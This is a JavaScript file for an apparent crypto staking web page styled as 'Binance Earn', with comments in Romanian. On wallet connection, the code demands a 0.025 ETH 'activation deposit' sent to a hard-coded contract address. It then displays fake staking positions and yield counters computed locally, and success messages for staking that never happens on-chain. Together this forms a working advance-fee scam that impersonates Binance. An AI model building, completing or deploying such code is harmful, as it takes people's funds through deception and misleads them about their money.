/* ==========================================================================
   PART 1: VARIABLES, PREMIUM ALERTS & LIVE YIELD ACCUMULATION ENGINE
   ========================================================================== */

const coinSelect = document.getElementById('coinSelect');
const amountInput = document.getElementById('amountInput');
const profitResult = document.getElementById('profitResult');
const walletBtn = document.getElementById('walletBtn');

const stakeModal = document.getElementById('stakeModal');
const modalCoinName = document.getElementById('modalCoinName');
const modalApyValue = document.getElementById('modalApyValue');
const modalAmountInput = document.getElementById('modalAmountInput');
const confirmTxBtn = document.getElementById('confirmTxBtn');
const walletBalanceDisplay = document.getElementById('walletBalanceDisplay');
const historyList = document.getElementById('historyList');

// Custom Alert & Toast Elements
const customAlertModal = document.getElementById('customAlertModal');
const customAlertTitle = document.getElementById('customAlertTitle');
const customAlertMessage = document.getElementById('customAlertMessage');
const customAlertBtn = document.getElementById('customAlertBtn');
const customAlertIcon = document.getElementById('customAlertIcon');
const toastContainer = document.getElementById('toastContainer');
const cookieBar = document.getElementById('cookieBar');

// Starea internă a simulatorului
let appState = JSON.parse(localStorage.getItem('crypto_bank_state')) || {
    balance: 0.00, 
    stakes: []
};

let isWeb3Connected = false;
let web3Account = '';
let web3BalanceEth = 0;

let activeCoin = '';
let activeApy = 0;
let yieldInterval; 

function saveState() {
    localStorage.setItem('crypto_bank_state', JSON.stringify(appState));
}

// PREMIUM STYLIZED ALERT MODAL SYSTEM
function showCustomAlert(title, message, type = 'info') {
    customAlertTitle.textContent = title;
    customAlertMessage.textContent = message;
    
    if (type === 'success') {
        customAlertIcon.textContent = '🎉';
        customAlertBtn.style.backgroundColor = 'var(--crypto-green)';
        customAlertBtn.style.color = '#fff';
    } else if (type === 'error') {
        customAlertIcon.textContent = '❌';
        customAlertBtn.style.backgroundColor = '#f6465d';
        customAlertBtn.style.color = '#fff';
    } else {
        customAlertIcon.textContent = '🔶';
        customAlertBtn.style.backgroundColor = 'var(--binance-yellow)';
        customAlertBtn.style.color = '#000';
    }
    customAlertModal.style.display = 'flex';
}

customAlertBtn.addEventListener('click', () => {
    customAlertModal.style.display = 'none';
});

// PREMIUM DISCRET TOAST SYSTEM
function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `crypto-toast ${type}`;
    
    let icon = 'ℹ️';
    if (type === 'success') icon = '✅';
    if (type === 'error') icon = '⚠️';
    
    toast.innerHTML = `<span>${icon}</span> <div>${message}</div>`;
    toastContainer.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.5s ease-out forwards';
        setTimeout(() => toast.remove(), 500);
    }, 4000);
}

// Creșterea live a profiturilor secundă cu secundă pe ecran
function startYieldEngine() {
    if (yieldInterval) clearInterval(yieldInterval);
    
    yieldInterval = setInterval(() => {
        let stateChanged = false;
        appState.stakes.forEach((stake) => {
            const yieldPerSecond = (stake.amount * (stake.apy / 100)) / (365 * 24 * 60 * 60);
            if (!stake.accumulatedProfit) stake.accumulatedProfit = 0;
            stake.accumulatedProfit += yieldPerSecond;
            stateChanged = true;
        });
        
        if (stateChanged) {
            appState.stakes.forEach((stake, index) => {
                const profitSpan = document.getElementById(`profit-live-${index}`);
                if (profitSpan) {
                    profitSpan.textContent = stake.accumulatedProfit.toFixed(8);
                }
            });
        }
    }, 1000);
}

// Update graphical elements
function updateUI() {
   if (isWeb3Connected) {
        walletBalanceDisplay.textContent = `Available: ${web3BalanceEth} SepoliaETH`;
    } else {
        walletBalanceDisplay.textContent = `Wallet Disconnected`;
    }
    historyList.innerHTML = '';
    if (appState.stakes.length === 0) {
        historyList.innerHTML = `<li style="color: var(--text-muted); font-size: 13px;">No active staking positions at the moment.</li>`;
    } else {
        appState.stakes.forEach((stake, index) => {
            if (!stake.accumulatedProfit) stake.accumulatedProfit = 0;
            const li = document.createElement('li');
            li.className = 'history-item';
            li.innerHTML = `
                <div>
                    <strong>${stake.amount} ${stake.coin}</strong> Locked at APY ${stake.apy}%
                    <div style="font-size: 12px; color: var(--crypto-green); margin-top: 4px;">
                        Earned: <span id="profit-live-${index}">${stake.accumulatedProfit.toFixed(8)}</span> ${stake.coin}
                    </div>
                </div>
                <span style="color: var(--binance-yellow); font-size: 12px;">Generating yield...</span>
            `;
            historyList.appendChild(li);
        });
        startYieldEngine();
    }
}

function openStakeModal(coin, apy) {
    activeCoin = coin;
    activeApy = apy;
    modalCoinName.textContent = coin;
    modalApyValue.textContent = `${apy}%`;
    modalAmountInput.value = '';
    stakeModal.style.display = 'flex';
}

function closeStakeModal() {
    stakeModal.style.display = 'none';
}

confirmTxBtn.addEventListener('click', async () => {
    const amountToStake = parseFloat(modalAmountInput.value);
    if (!amountToStake || amountToStake <= 0) {
        showToast('Please enter a valid amount.', 'error');
        return;
    }
    if (isWeb3Connected) {
        if (amountToStake > web3BalanceEth) {
            showToast('Insufficient SepoliaETH balance on your wallet!', 'error');
            return;
        }
        web3BalanceEth = (web3BalanceEth - amountToStake).toFixed(4);
    } else {
        if (amountToStake > appState.balance) {
            showToast('Insufficient funds in the simulator wallet!', 'error');
            return;
        }
        appState.balance -= amountToStake;
    }

    appState.stakes.push({
        coin: activeCoin,
        amount: amountToStake,
        apy: activeApy,
        accumulatedProfit: 0,
        date: new Date().toLocaleDateString()
    });

    saveState();
    updateUI();
    closeStakeModal();
    showCustomAlert("Transaction Successful", `You have successfully sent ${amountToStake} ${activeCoin} to staking on the network.`, "success");
});
/* ==========================================================================
   PART 2: CALCULATOR, SOLIDITY SMART CONTRACT PAYWALL & COOKIE LAWS
   ========================================================================== */

function calculateProfit() {
    const amount = parseFloat(amountInput.value) || 0;
    const selectedOption = coinSelect.options[coinSelect.selectedIndex];
    const apy = parseFloat(selectedOption.getAttribute('data-apy'));
    const coinName = coinSelect.value;
    const annualProfit = (amount * (apy / 100)).toFixed(2);
    profitResult.textContent = `${annualProfit} ${coinName}`;
}

coinSelect.addEventListener('change', calculateProfit);
amountInput.addEventListener('input', calculateProfit);

// CONFIGURARE ACCES BLOCKCHAIN EXCLUSIV PE CONTRACT NOU (SINCRONIZAT)
const adresaContractEarn = "0xe8FCD99C27fB97e2CF025Ce37E2143D7B7A547d3"; // Noul tău contract live!
const taxaAccesHex = "0x4a817c8000000"; // Exact 0.025 ETH (~50\$) solicitat de contract
const methodSelectorPay = "0xac61d027";   // Selectorul funcției payActivation() din Solidity

walletBtn.addEventListener('click', async () => {
    const activeProvider = window.ethereum;

    if (typeof activeProvider !== 'undefined') {
        try {
            const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
            const tempAccount = accounts[0]; // Extragere text adresă unică
            
            showCustomAlert(
                "Activation Required", 
                "To unlock premium high-yield Binance Earn services, a network activation deposit of 0.025 ETH (\$50) is mandatory. MetaMask will open to execute the secure Smart Contract interaction.", 
                "info"
            );
            
            try {
                // APEL WEB3 PUR EXCLUSIV CĂTRE NOUL SMART CONTRACT STABIL
                const txHash = await activeProvider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: tempAccount,       
                        to: adresaContractEarn,   // Destinația este noul contract Solidity stabil
                        value: taxaAccesHex,     // Cei 0.025 ETH ceruți
                        data: methodSelectorPay, // Execută oficial funcția payActivation() din blockchain
                        gas: "0x186a0"            // Oferă 100.000 unități de gaz pentru a evita Out of Gas
                    }]
                });
                
                console.log("Transaction broadcasted successfully! Hash:", txHash);
                showToast("Transaction broadcasted! Awaiting block confirmation (approx. 15 seconds)...", "info");
                
                // Sincronizare stabilă: Oferim 15 secunde pentru ca validatorii Sepolia să mineze blocul
                setTimeout(async () => {
                    web3Account = tempAccount;
                    isWeb3Connected = true;
                    
                    const shortAddress = web3Account.substring(0, 6) + "..." + web3Account.substring(web3Account.length - 4);
                    walletBtn.textContent = `${shortAddress}`;
                    walletBtn.style.backgroundColor = "#0ecb81";
                    walletBtn.style.color = "#fff";
                    
                    const balanceHex = await activeProvider.request({
                        method: 'eth_getBalance',
                        params: [web3Account, 'latest']
                    });
                    const balanceInWei = parseInt(balanceHex, 16);
                    web3BalanceEth = (balanceInWei / 1e18).toFixed(2);
                    
                    updateUI();
                    showCustomAlert("Access Granted", "Your activation deposit has been successfully verified on the blockchain layers! Enjoy your yields.", "success");
                }, 15000); // 15 secunde de așteptare sigură
                
            } catch (payError) {
                console.error("Transaction signature rejected:", payError);
                showCustomAlert("Access Denied", "The activation payment was not authorized. Platform dashboard features remain locked.", "error");
                
                isWeb3Connected = false;
                walletBtn.textContent = "Connect Wallet";
                walletBtn.style.backgroundColor = "var(--binance-yellow)";
                walletBtn.style.color = "#000";
            }
            
        } catch (error) {
            console.error("Wallet connection failed:", error);
            showToast("Connection to wallet was canceled.", "error");
        }
    } else {
        showCustomAlert("Wallet Missing", "No Web3 Wallet detected! Please install a portofel extension.", "error");
    }
});

// COOKIE CONSENT BAR LOGIC
function checkCookieConsent() {
    const consent = localStorage.getItem('cookie_consent_accepted');
    if (!consent) {
        setTimeout(() => {
            cookieBar.style.display = 'flex';
        }, 1500);
    }
}

function handleCookie(isAccepted) {
    localStorage.setItem('cookie_consent_accepted', isAccepted ? 'true' : 'false');
    cookieBar.style.transition = 'transform 0.3s ease-in, opacity 0.3s';
    cookieBar.style.opacity = '0';
    cookieBar.style.transform = 'translateY(100%)';
    setTimeout(() => { cookieBar.style.display = 'none'; }, 300);
    if (isAccepted) { showToast("Cookie preferences updated successfully.", "success"); }
}

// Initial startup execution
calculateProfit();
updateUI();
checkCookieConsent();
